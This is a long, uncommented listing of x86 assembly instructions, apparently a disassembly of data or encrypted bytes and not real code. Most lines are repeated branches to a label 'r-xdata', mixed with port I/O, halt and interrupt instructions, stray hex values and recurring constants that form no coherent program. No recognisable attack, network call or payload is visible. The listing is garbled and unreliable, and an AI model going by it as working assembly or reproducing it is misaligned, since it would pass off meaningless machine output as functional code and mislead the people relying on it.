jb r-xdata
jb r-xdata
mov dl 0x6f
jb r-xdata
mov bh 0xa
cmpsd [ esi ] [ edi ]
push ds
jb r-xdata
sbb eax 0xa751db2
jb r-xdata
popad
jb r-xdata
mov esp 0xe2efb40b
loop r-xdata
jb r-xdata
jb r-xdata
test [ ebx - 0x51 ] ch
xchg esi eax
test [ ebx - 0x51 ] ch
adc [ ebx + 0x6b84cc88 ] bh
pop edi
jb r-xdata
loop r-xdata
loop r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
loop r-xdata
jb r-xdata
outsd
jb r-xdata
xchg edi eax
movsb [ edi ] [ esi ]
salc
or esp [ esi - 0x11 ]
loop r-xdata
sbb eax 0x104c0a72
sbb eax 0x2267bb1d
jb r-xdata
jb r-xdata
mov al [ 0x45f7be6a ]
popad
sbb al 0xc2
jb r-xdata
sbb eax 0xf60b67ed
jb r-xdata
loop r-xdata
jb r-xdata
jb r-xdata
and [ edx + 0x72 ] esi
jb r-xdata
adc [ 0x7272721d ] bl
sbb eax 0xa70b9488
xchg esi eax
outsd
jb r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
imul ebp [ edi + 0x160f0bee ] 0x6f721d1d
jb r-xdata
sbb eax 0xe2e20a75
jb r-xdata
jb r-xdata
sbb eax 0xe2e26274
loop r-xdata
0xf7be6aa0 0x6145
jb r-xdata
loop r-xdata
jb r-xdata
mov ah 0xef
loop r-xdata
sbb eax 0x7272721d
or bl [ ebp + 0xb1d1d38 ]
sbb eax 0xb94881d
jb r-xdata
cmp [ ebx + ecx + 0x1d1d07b0 ] esi
jb r-xdata
jb r-xdata
and ch ch
mov ah 0x3d
out 0xe3 al
loop r-xdata
loop r-xdata
jb r-xdata
jb r-xdata
or edx [ ebx ]
loop r-xdata
jb r-xdata
and ah dl
jb r-xdata
out 0xc6 al
arpl [ esi ] cx
dec esi
out 0xe2 al
loop r-xdata
jb r-xdata
imul ecx [ esi ] 0x8ae688b5
or esi [ edi + ebp * 8 + 0x7272e2e2 ]
jb r-xdata
sbb [ 0x751db21d ] ebx
or eax ebp
or ah dl
mov dh 0x19
and al 0xea
mov esi 0x1c6145f7
retn 0x60ed
in eax dx
pushad
or edi [ edi ]
mul dl
loop r-xdata
or ecx [ eax - 0x14 ]
cmpsd [ esi ] [ edi ]
push ds
loope r-xdata
jb r-xdata
mov esi 0xb21d1d1f
rcl [ esp + esi * 4 ] 0x1
sbb eax 0x6e0baeb5
jb r-xdata
jb r-xdata
loop r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
out dx al
or ecx [ edi ]
push ss
jb r-xdata
jb r-xdata
in eax dx
sbb eax 0xa721d1d
jb r-xdata
loop r-xdata
sbb ah [ edi + 0x1d ]
in eax dx
or esi esi
push edx
push 0xffffffbe
jb r-xdata
loop r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
shl dl 0x1
loop r-xdata
outsd
sbb eax 0x7272721d
jb r-xdata
imul ebp [ edi + 0xb808818 ] 0x6c
push ds
movsb [ edi ] [ esi ]
salc
mov dl 0xb
pop edx
cld
loop r-xdata
mov dh ah
jb r-xdata
or edi [ edi + 0x72e2e2f4 ]
jb r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
adc esi edx
loop r-xdata
outsd
loop r-xdata
jb r-xdata
add [ 0x1ea71d1d ] ebx
mov ch 0xb
add eax [ 0x676f1d1d ]
jb r-xdata
jb r-xdata
loop r-xdata
loop r-xdata
loop r-xdata
sbb eax 0xb1ea71d
dec eax
jb r-xdata
into
outsb
or ebx esp
xor bl [ ebx - 0x629e8de3 ]
retn 0xbe3
mov [ 0xffffffffc6e66bfa ] al
jb r-xdata
loop r-xdata
and ah dl
jb r-xdata
jb r-xdata
jb r-xdata
movhps xmm3 [ 0xffffffffb76f721d ]
jb r-xdata
loop r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
test [ ebp + 0x61 ] 0x60edc21c
fldenv [ esi + edx * 8 - 0x1d1099f5 ]
loop r-xdata
loop r-xdata
or ebp [ esi - 0x32 ]
loop r-xdata
jb r-xdata
or esp [ edi + 0x721d1d10 ]
jb r-xdata
jb r-xdata
test [ ebx - 0x41 ] ch
push ds
sar [ ecx ] 0x1
test [ ebx - 0x41 ] ch
sbb al 0xb
lodsb [ esi ]
shl edx 0x1
loop r-xdata
outsd
imul esp [ edi + 0x16971dea ] 0x1d0e4b0b
sbb eax 0x72727272
jb r-xdata
jb r-xdata
jb r-xdata
hlt
jb r-xdata
imul ebp [ edi - 0x7b4f44f6 ] 0x6b
scasd [ edi ]
mov [ edx + 0x65e0bb8 ] bl
sbb eax 0x7272721d
jb r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
or ecx [ ebp + 0x39 ]
sbb eax 0x7272721d
jb r-xdata
loop r-xdata
loop r-xdata
or bl [ ebx - 0x2e1d1d0b ]
and cl [ ebx ]
push ecx
in eax 0xe2
adc [ 0x2267bb1d ] bl
sbb eax 0x4c0a721d
jb r-xdata
loop r-xdata
sbb eax 0xe288ee97
sbb eax 0xe2e26272
loop r-xdata
loop r-xdata
xchg esi eax
jb r-xdata
jb r-xdata
jb r-xdata
mov ebx 0x72727221
sbb eax 0xb76f721d
jb r-xdata
jb r-xdata
push cs
scasd [ edi ]
jb r-xdata
jb r-xdata
sbb eax 0x1ea71d1d
jb r-xdata
int 0xf0
loop r-xdata
and ch ch
dec esp
fcomp [ 0xa721d1d ]
jb r-xdata
imul esp [ 0x1d028b0b ] 0x7272721d
jb r-xdata
jb r-xdata
push cs
arpl [ esi ] cx
mov dh 0xeb
jb r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
loop r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
push ss
jb r-xdata
jb r-xdata
jb r-xdata
sti
jb r-xdata
jb r-xdata
sbb eax 0x7272721d
outsd
sbb bl [ edi ]
sbb eax 0xf5e20a1d
cmpsd [ esi ] [ edi ]
and dh [ edx + 0x1fbe676f ]
sbb eax 0x971db21d
0xb236a76f 0x9b0b
cli
jb r-xdata
imul esp esi 0xffffffc6
sbb ah [ edi + 0x1d ]
in eax dx
loop r-xdata
shl [ edx ] 0x1
mov cl 0xb
mov al [ 0xffffffffd1e2e2f8 ]
popad
jb r-xdata
sbb eax 0x7272721d
jb r-xdata
loop r-xdata
fwait
cmc
loop r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
mov ebx 0x100bba88
retn 0xe2e2
jb r-xdata
sbb eax 0x751db21d
outsd
mov dh 0x19
push ds
mov bl 0xb
and dh [ edx - 0x50901f78 ]
in al dx
sbb eax 0x480b1ea7
loopne r-xdata
fldenv [ ecx ]
in eax dx
or edx [ edx ]
jb r-xdata
jb r-xdata
pop es
sbb eax 0x7272721d
jb r-xdata
mov cl 0xb4
mov ch [ ebx - 0x3f ]
jb r-xdata
jb r-xdata
jb r-xdata
sbb eax 0x971d1e97
push es
sbb eax 0xe28afeb5
outsd
sbb eax 0x72727272
jb r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
or edx [ esi + 0x721d1d01 ]
add [ 0x7272721d ] ebx
jb r-xdata
jb r-xdata
mov edx 0x1d3e360b
or edx eax
loop r-xdata
jb r-xdata
jb r-xdata
sbb eax 0xf2a1691d
and ch ch
mov si 0xe2ff
loop r-xdata
in eax dx
jb r-xdata
jb r-xdata
loop r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
jecxz r-xdata
shl [ edx ] 0x1
or edx [ ecx - 0x1b ]
loop r-xdata
loop r-xdata
mov bh 0x69
cli
or edi [ esp + ebp * 8 + 0x751de2e2 ]
inc esi
loop r-xdata
sbb eax 0x971db272
jb r-xdata
loop r-xdata
imul esp [ edi - 0x115096e2 ] 0x1d160f0b
mov edx 0xe2c2100b
loop r-xdata
jb r-xdata
push cs
jb r-xdata
xchg esp eax
jb r-xdata
push ds
imul edi [ edi - 0x7bc62ee2 ] 0x6b
mov edi 0xd1ac0b1c
loop r-xdata
ror [ ebx ] 0xe2
jb r-xdata
or [ ebx ] 0x79
jb r-xdata
jb r-xdata
jb r-xdata
xchg edi eax
push ds
sbb eax 0xb51d0697
dec [ edx - 0x1d1d9d1e ]
jb r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
loop r-xdata
sbb eax 0x72727272
jb r-xdata
jb r-xdata
loope r-xdata
jb r-xdata
ror ah 0x1
loop r-xdata
jb r-xdata
jb r-xdata
mov [ 0x1d1e9f6b ] bl
or esi [ ecx + 0x72e2e2ff ]
jb r-xdata
loop r-xdata
loop r-xdata
jb r-xdata
outsd
push cs
mov ch 0x88
out 0x8a al
shr [ ebx ] 0x1
or ecx [ edx - 0x7 ]
loop r-xdata
scasd [ edi ]
0x1d01b00b 0x721d
and eax 0x918e1ea7
jb r-xdata
jb r-xdata
jb r-xdata
add [ eax ] 0x72721d1d
mov [ ebp - 0x1d0c1cf5 ] cl
jb r-xdata
or eax 0x72721d1d
jb r-xdata
or edi edx
jb r-xdata
sbb eax 0x1db2721d
sar [ edx - 0x63f43878 ] 0x1e
sbb cl [ ebx ]
jb r-xdata
adc dl al
jb r-xdata
loop r-xdata
sbb eax 0xb4727272
jb r-xdata
jb r-xdata
loopne r-xdata
loop r-xdata
imul ecx [ esi ] 0xebb60e63
loop r-xdata
jb r-xdata
cmp eax 0x72721d1d
jb r-xdata
jns r-xdata
jb r-xdata
jb r-xdata
cmpsd [ esi ] [ edi ]
jb r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
cmpsd [ esi ] [ edi ]
jb r-xdata
jb r-xdata
jb r-xdata
popad
sahf
jb r-xdata
jb r-xdata
loop r-xdata
and ah [ esi - 0x1e ]
imul esp [ edi + 0xaa76b1a ] 0x1d1ab20b
jb r-xdata
sbb eax 0x72727272
jb r-xdata
jb r-xdata
jb r-xdata
out 0x6b al
cmpsb [ esi ] [ edi ]
jb r-xdata
loop r-xdata
jb r-xdata
scasd [ edi ]
push ss
loope r-xdata
jb r-xdata
jb r-xdata
loop r-xdata
push ds
jb r-xdata
loop r-xdata
jb r-xdata
jb r-xdata
lea ecx [ ebx ]
jecxz r-xdata
sbb [ 0xb94881d ] bl
mov edi 0x72e2e2f4
jb r-xdata
jb r-xdata
loop r-xdata
jb r-xdata
and eax 0x1d028b0b
sbb eax 0x72727272
jb r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
sbb eax 0x72727272
jb r-xdata
cld
loop r-xdata
jb r-xdata
sbb eax 0x7272721d
jb r-xdata
jb r-xdata
jb r-xdata
loop r-xdata
mov ss [ ecx + 0x741de2c0 ]
jb r-xdata
or edi [ ecx + 0x3e ]
jb r-xdata
jb r-xdata
mov dl 0xb
jb r-xdata
loop r-xdata
mul [ es : edi + 0x22 ]
or esi [ edx ]
adc eax 0x72721d1d
jb r-xdata
xchg ebp eax
jb r-xdata
sbb ch [ ebx - 0x59 ]
jb r-xdata
or cl [ ebx ]
sbb ch [ ecx - 0x59 ]
jb r-xdata
0xe2e2
jb r-xdata
jb r-xdata
loop r-xdata
jb r-xdata
mul [ ebx - 0x12115027 ]
pushad
adc al 0xfb
int3
mov dh ah
imul esp [ esi - 0x1d75353a ] 0xffffffd2
loop r-xdata
jb r-xdata
cmpsd [ esi ] [ edi ]
sbb ch [ edi - 0x51 ]
add dh [ ebx + 0x691e921d ]
shl dl 0x1d
xchg ecx eax
jb r-xdata
imul esi [ edi + 0x1ea7691a ] 0x6b
and bh [ ebp + 0x212bb9bc ]
jb r-xdata
or esp [ eax - 0x2e1d1d08 ]
loop r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
mov ah cl
adc cl [ esi ]
jb r-xdata
test [ ebx - 0x51 ] ch
sbb bh [ ebx + 0x18af6b84 ]
mov [ eax + 0x1d1e6c0b ] al
sbb eax 0x72727272
jb r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
dec ebx
retn 0xe2e2
jb r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
imul esi esp 0x3d
sbb eax 0xc7510b1d
loop r-xdata
jb r-xdata
adc al 0xd
jb r-xdata
sbb eax 0x7272721d
jb r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
or edx [ ebx + 0x72e2e2ca ]
loop r-xdata
jb r-xdata
into
xchg bp ax
jb r-xdata
cmpsd [ esi ] [ edi ]
jb r-xdata
push ds
cmpsd [ esi ] [ edi ]
jb r-xdata
loop r-xdata
jb r-xdata
push es
jb r-xdata
jb r-xdata
lahf
push ds
in eax dx
popf
add [ 0xffffffffe688b51d ] ebx
outsd
cmpsd [ esi ] [ edi ]
jb r-xdata
loop r-xdata
loope r-xdata
mov eax [ 0x721d1d3d ]
jb r-xdata
loop r-xdata
jb r-xdata
je r-xdata
sbb eax 0x1d1e9f6b
jb r-xdata
jb r-xdata
mov ch bh
or [ ecx + 0x2a ] ch
test [ ebx - 0x51 ] ch
mov dl al
test [ ebx - 0x51 ] ch
or bh [ ebx - 0x50947b50 ]
jb r-xdata
sbb eax 0x7272212b
jb r-xdata
cmp ah [ edi + 0x39 ]
jb r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
shl [ edx ] 0x1
jb r-xdata
mov dl 0xb
jb r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
sbb eax 0xe2e25a74
jb r-xdata
sbb eax 0x72727272
jb r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
and bl bl
jb r-xdata
mov dl 0x88
loop r-xdata
jb r-xdata
or esi [ esi ]
sbb eax 0x7272721d
jb r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
or esi [ edx + 0x721d1d1a ]
jb r-xdata
imul esp [ edi + 0x1aa76906 ] 0x6b
shl [ edx ] 0x1
jb r-xdata
jb r-xdata
cmpsd [ esi ] [ edi ]
jb r-xdata
imul esp [ edi + 0x6a76b1e ] 0x6b1aa769
jb r-xdata
sbb eax 0x7272721d
jb r-xdata
loop r-xdata
sbb eax 0x7272721d
jb r-xdata
loop r-xdata
je r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
and [ edx + 0x72 ] esi
jb r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
cmp [ ebx ] ecx
jb r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
and cl [ eax - 0x58947b34 ]
jb r-xdata
jb r-xdata
jb r-xdata
imul esp [ edx + eax * 4 + 0x1d3e790b ] 0x1d
jb r-xdata
jb r-xdata
push ds
jb r-xdata
test [ ebx - 0x59 ] ch
jb r-xdata
popad
clc
jb r-xdata
pop edx
jb r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
mov esp [ edx ]
jb r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
sub esp [ ecx ]
jb r-xdata
cmpsd [ esi ] [ edi ]
jb r-xdata
retn 0x6b84
pop esp
sbb al 0x1d
sbb eax 0x72727272
jb r-xdata
push ds
jb r-xdata
loop r-xdata
jb r-xdata
adc ebp ebp
jb r-xdata
sbb bl [ 0x7272721d ]
jb r-xdata
jb r-xdata
sbb eax 0x72727272
imul esp [ edi + 0x1ab20b0a ] 0x1d
jb r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
test [ ebx - 0x41 ] ch
jb r-xdata
jb r-xdata
mov ebx 0x3caf6b84
or edx [ esi + 0x39 ]
sbb eax 0x7272721d
mov ebx 0x6b84cc88
scasd [ edi ]
jb r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
xor [ edx ] dl
jb r-xdata
jb r-xdata
jb r-xdata
adc bl [ 0x7272721d ]
imul edi [ edx ] 0x300b3967
jb r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
int3
jb r-xdata
in eax dx
mov ch 0x6b
jb r-xdata
mov bl 0x1d
xchg edx eax
0xbeaafe1 0x1b0
cmpsd [ esi ] [ edi ]
sar [ ecx ] 0x1
test [ ebx - 0x41 ] ch
enter 0x3d69 0x84
loop r-xdata
js r-xdata
mov [ esp + eax * 4 + 0x69fea76b ] cl
and [ ebx ] cl
cmpsd [ esi ] [ edi ]
loop r-xdata
jb r-xdata
or esp [ ecx + 0x721d1d3d ]
jb r-xdata
jb r-xdata
imul esp [ edi + 0xb2069fe ] 0xffffffa7
jb r-xdata
out dx al
mov cl 0x1d
mov ah 0xd6
or edi esi
lahf
jb r-xdata
jb r-xdata
or al 0x13
jb r-xdata
in eax dx
ja r-xdata
imul ecx [ esi ] 0x88ee0e61
jb r-xdata
imul esp [ edi - 0x24dd2ee2 ] 0xffffffa7
push cs
xchg ebx eax
jb r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
cmpsd [ esi ] [ edi ]
sti
jb r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
mov edi 0xdc0bb91a
jb r-xdata
loop r-xdata
or esi [ edx + eax * 8 ]
jb r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
sbb eax 0x7272721d
or ebx [ ebp + 0x72e2e2f4 ]
jb r-xdata
mov ecx 0x72727221
jb r-xdata
cmp [ bp + di ] ecx
jb r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
imul esp [ edi - 0x6b774510 ] 0xffffff84
imul esp [ edi + 0x6b84ba16 ] 0xffffffa7
jb r-xdata
movsb [ edi ] [ esi ]
jb r-xdata
imul edx [ edx ] 0x66ed11d9
inc ebx
and ah dl
loop r-xdata
loop r-xdata
or edx [ ecx + 0x72721d1d ]
jb r-xdata
jb r-xdata
cmp [ ebx + ebp * 2 + 0x3d69c8bf ] eax
loop r-xdata
jb r-xdata
imul ebp edx 0xbeaafe1
mov al 0x1
sbb eax 0x7272721d
mov ch 0x1d
xchg edi eax
imul esp [ edi + 0x2af6f1a ] 0x1e921db3
sbb eax 0xd10a721d
adc bl [ 0x30fe8a1d ]
jb r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
mov dl 0x1a
jb r-xdata
loop r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
adc al 0x88
mov [ esp + eax * 4 - 0x45e95895 ] dl
jb r-xdata
jb r-xdata
jb r-xdata
xchg [ esi ] ebx
and ah [ edx - 0x1d0743f5 ]
jb r-xdata
push ebp
jb r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
hlt
jb r-xdata
sub ecx [ ebx ]
jb r-xdata
or esi [ eax ]
jb r-xdata
jb r-xdata
jb r-xdata
in eax 0xfb
loop r-xdata
mov ah 0xb4
jb r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
or eax 0x72721d1d
jb r-xdata
jb r-xdata
or ah dl
sbb ebx [ 0xffffffffd912691d ]
jb r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
push cs
jb r-xdata
sbb eax 0x7272721d
jb r-xdata
cmpsd [ esi ] [ edi ]
jb r-xdata
jb r-xdata
stosb [ edi ]
jb r-xdata
test [ ebx - 0x59 ] ch
movsd [ edi ] [ esi ]
jb r-xdata
mov [ ebx + ebp * 2 + 0x2069fea7 ] es
or esp [ edi + 0x72e2e2fc ]
jb r-xdata
loop r-xdata
jb r-xdata
mov eax [ 0xffffffffe165e669 ]
jb r-xdata
test [ ebx - 0x41 ] ch
jb r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
or eax [ eax - 0x36 ]
loop r-xdata
loop r-xdata
jb r-xdata
loop r-xdata
push cs
movlps [ 0x7272721d ] xmm3
jb r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
popad
and al ah
test [ ecx - 0x22 ] ah
loop r-xdata
0xe2e68f0b 0x72e2
imul esp [ edx - 0x1ee41e06 ] 0x6b13e13b
mov dl al
jb r-xdata
xchg esp eax
jb r-xdata
jb r-xdata
imul edi [ edi - 0x23f446e6 ] 0xffffffc6
loop r-xdata
jb r-xdata
sbb eax 0x72727272
jb r-xdata
pop esi
rcl [ edx ] 0x1
jb r-xdata
out dx al
jb r-xdata
jb r-xdata
jb r-xdata
std
mov dl ch
jb r-xdata
jb r-xdata
jb r-xdata
mov edx 0x6b848c88
jb r-xdata
imul esp [ eax ] 0xe2fca70b
loop r-xdata
jb r-xdata
cdq
jb r-xdata
mov ah cl
shl [ edx ] 0x1
jb r-xdata
mov bh 0x2a
test [ ebx - 0x49 ] ch
adc [ eax + 0x6b848e88 ] bh
sbb cl cl
adc dh [ edi ]
jb r-xdata
out 0x65 al
jb r-xdata
inc esi
mov edi 0xb76b8442
jb r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
0x721d1d38 0x7272
jb r-xdata
jb r-xdata
jb r-xdata
sub ecx [ bp + di ]
loope r-xdata
jb r-xdata
mov cl 0xb
not [ edi ]
sbb eax 0x7272721d
outsd
inc edx
pop ss
sbb eax 0xbb2b11d
retn 0xe2f7
jb r-xdata
sbb eax 0x7272721d
in eax dx
0xe2e2
popfd
jb r-xdata
and [ edx + 0x72 ] esi
jb r-xdata
pop [ ebx + ebp * 2 - 0x77450759 ]
or edi edi
cli
loop r-xdata
test [ ebx - 0x59 ] ch
fistp [ ecx - 0x334cf436 ]
jb r-xdata
sbb bh [ ecx - 0x1d3923f5 ]
loop r-xdata
popad
jb r-xdata
sbb eax 0x30fe8a1d
jb r-xdata
or edi [ eax - 0x14 ]
jb r-xdata
jb r-xdata
jb r-xdata
outsd
fst [ ecx ]
jb r-xdata
in eax dx
cmpsd [ esi ] [ edi ]
jb r-xdata
or esp [ ecx + 0x3d ]
jb r-xdata
or esi [ ebx + 0x72e2e2cc ]
jb r-xdata
jb r-xdata
jl r-xdata
jb r-xdata
sbb eax 0x39d11269
fst [ ecx ]
loop r-xdata
sbb eax 0x6c66ed1d
jb r-xdata
jb r-xdata
0x1d3ac20b 0x721d
loope r-xdata
jb r-xdata
test [ ebx - 0x49 ] ch
jb r-xdata
imul esp eax 0x7221e3c9
jb r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
xchg [ edx + 0x1ea76b84 ] edi
loope r-xdata
jb r-xdata
loop r-xdata
loop r-xdata
jb r-xdata
jb r-xdata
test [ ebx - 0x59 ] ch
jb r-xdata
0xb30b
jb r-xdata
loop r-xdata
mov bh dh
jb r-xdata
loop r-xdata
jb r-xdata
jb r-xdata
in eax dx
mov ah 0x88
jb r-xdata
cmp eax 0x72721d1d
jb r-xdata
popad
jb r-xdata
int3
jb r-xdata
test [ ebx - 0x59 ] ch
jb r-xdata
popad
push es
sbb ah [ ebx + 0xe ]
loop r-xdata
adc edx [ ebx ]
jb r-xdata
jb r-xdata
loopne r-xdata
in eax dx
insb
jb r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
sbb eax 0x710bceb4
aas
or cl [ ebx - 0x44e2e2cc ]
mov bh 0x46
jb r-xdata
jb r-xdata
jb r-xdata
imul esp esi 0xeaa7e165
or eax edx
cmp bl [ 0x7272721d ]
jb r-xdata
jb r-xdata
jb r-xdata
imul edi [ edi - 0x48947bbe ] 0x46
jb r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
imul esp [ edi + 0xb22671a ] 0xffffff9a
jb r-xdata
xchg al ch
loop r-xdata
and ch ch
call [ bx + di ]
sbb eax 0xbabe881d
test [ ebx - 0x59 ] ch
jb r-xdata
or ecx [ edi ]
jb r-xdata
sbb ah [ edi + 0x22 ]
adc ebp [ ebx - 0x59 ]
jb r-xdata
loop r-xdata
mov bl 0xcc
jb r-xdata
xor [ esi + 0x6b ] bl
jb r-xdata
out dx al
sbb eax 0xd912691d
popad
jb r-xdata
or ebp ebp
or bl [ 0x7272721d ]
retn 0xff0b
jb r-xdata
sbb eax 0x72727272
jb r-xdata
sbb eax 0x7272721d
jb r-xdata
loop r-xdata
jb r-xdata
cmpsd [ esi ] [ edi ]
jb r-xdata
jb r-xdata
loop r-xdata
push cs
mov cl 0x1d
test [ esi - 0x1e ] 0x120be2e2
aaa
jb r-xdata
loop r-xdata
sbb eax 0xa725721d
jb r-xdata
sbb eax 0x810bbeb5
jb r-xdata
insb
jb r-xdata
loop r-xdata
jb r-xdata
jb r-xdata
popad
jb r-xdata
jb r-xdata
mov ebx 0xed2267bd
jb r-xdata
jb r-xdata
loope r-xdata
jb r-xdata
jb r-xdata
inc edx
jb r-xdata
jb r-xdata
leave
shl [ edx ] 0x1
test [ ebx - 0x59 ] ch
sbb al 0x6f
cmpsd [ esi ] [ edi ]
adc dh [ edx + 0xaeaa769 ]
mov [ edi - 0x58947b46 ] al
sbb cl [ eax + 0x6b84ba9a ]
cmpsd [ esi ] [ edi ]
jb r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
sbb [ eax + 0x6b84ba87 ] cl
cmpsd [ esi ] [ edi ]
push ds
xchg [ edx + 0x1aa76b84 ] edi
mov [ edx - 0x58947b46 ] bl
inc eax
adc ebx [ 0x7272721d ]
jb r-xdata
cmpsd [ esi ] [ edi ]
jb r-xdata
jb r-xdata
imul esi [ ebp + 0xb82a46b ] 0x79
jb r-xdata
imul esp [ edi + 0xb22d136 ] 0x58
jb r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
or [ ebx ] 0x61
jb r-xdata
and ch al
or ecx [ ebx + edx ]
push ss
mov edx 0x14a76b84
mov [ eax + 0x1d3d610b ] al
mov edx 0x6b849488
cmpsd [ esi ] [ edi ]
loop r-xdata
jb r-xdata
jb r-xdata
mov cl 0xb4
mov ch 0xa
pop es
or esp edi
sbb [ 0x7272721d ] bl
or ecx [ ebx ]
loope r-xdata
jb r-xdata
out dx al
mov ch 0xbe
jb r-xdata
loop r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
loop r-xdata
jb r-xdata
xor al 0x1d
jb r-xdata
and ch ch
jb r-xdata
jb r-xdata
cmpsd [ esi ] [ edi ]
sbb eax 0x6f72721d
cmpsd [ esi ] [ edi ]
imul esp [ edi + 0x1ea7611e ] 0xffffffe6
or eax ecx
retn 0xe2e2
mov dl 0x1d
mov ah 0xce
or esi [ ecx + 0x3f ]
jb r-xdata
sbb eax 0x67bdbbbb
imul esi [ edi + 0x348b0a46 ] 0x1d
jb r-xdata
loopne r-xdata
loop r-xdata
jb r-xdata
out 0xa1 al
jb r-xdata
jb r-xdata
jb r-xdata
push ecx
nop [ 0x1d100f0b ] ebx
sbb eax 0x72727272
jb r-xdata
push esp
in eax 0xb2
arpl [ 0xffffffffe2e2e228 ] sp
outsd
add eax 0xb21d1d10
mov cl 0xb1
mov ch ah
mov cl 0x1d
jne r-xdata
and cl [ bp + di ]
jb r-xdata
mov [ edx ] esp
call 0x1d58be9a
sbb eax 0x12d10a72
0x8816a76f 0xbe2
jb r-xdata
mov dl 0xb4
jb r-xdata
jb r-xdata
sbb eax 0x88b4b4b2
jb r-xdata
jb r-xdata
mov ch 0xb2
loop r-xdata
jb r-xdata
push esp
loop r-xdata
jb r-xdata
sbb eax 0x72727272
loop r-xdata
0x6fe2e2e0 0x1a67
jb r-xdata
loop r-xdata
push cs
or eax [ ecx + 0x72e2e2fe ]
in eax dx
jl r-xdata
imul edx [ edx ] 0x11d939d1
popad
jb r-xdata
jb r-xdata
jb r-xdata
loop r-xdata
int3
jb r-xdata
in eax dx
jb r-xdata
jb r-xdata
in eax dx
jb r-xdata
loop r-xdata
jecxz r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
or ebx [ edx + 0x721d1d38 ]
jb r-xdata
cmpsd [ esi ] [ edi ]
push ss
mov dl ah
or eax [ edx ]
popad
jb r-xdata
jb r-xdata
xor al 0x1d
mov ah 0xb5
or al [ edi ]
mov dl [ ebx ]
jb r-xdata
sbb al 0xb
jb r-xdata
or ecx [ es : eax + 0x1a ]
sbb bl [ bx ]
sbb eax 0xc2320b1d
loop r-xdata
push ds
sbb eax 0x2267aeb4
or edx [ ebx ]
adc ebx [ 0xffffffffa725721d ]
outsd
jb r-xdata
jb r-xdata
jb r-xdata
loop r-xdata
jb r-xdata
insb
mov [ edx - 0x20 ] 0xe2
loop r-xdata
or esp [ edx - 0x20 ]
leave
jb r-xdata
jb r-xdata
jb r-xdata
mov eax [ 0x18930bf6 ]
jb r-xdata
jb r-xdata
mov esi [ ebx - 0x424444e3 ]
jb r-xdata
cmpsd [ esi ] [ edi ]
0x1d0f510a 0xb1d
loop r-xdata
pop es
sbb eax 0x7272721d
jb r-xdata
mov ebx 0x2267bdbb
jb r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
cmp [ 0x7272721d ] bl
jb r-xdata
jb r-xdata
jb r-xdata
mov dh 0x67
jb r-xdata
dec [ ebx + 0x26541da2 ]
jb r-xdata
push esp
jb r-xdata
sahf
jb r-xdata
sbb eax 0xb51d3e97
jb r-xdata
cmpsd [ esi ] [ edi ]
mov ah 0xae
and cl [ bp + di ]
jb r-xdata
jb r-xdata
adc [ edx + 0x1d0c110b ] bh
sbb eax 0x72727272
jb r-xdata
mov bh al
test [ ebx - 0x59 ] ch
jb r-xdata
jb r-xdata
mov esp [ edx ]
jb r-xdata
sbb eax 0x9269721d
fsubrp st1
adc ch ch
push ebp
mov dl 0x69
and al 0xa
jb r-xdata
test [ ecx - 0x26 ] ah
sbb eax 0xaa76f1d
jb r-xdata
jb r-xdata
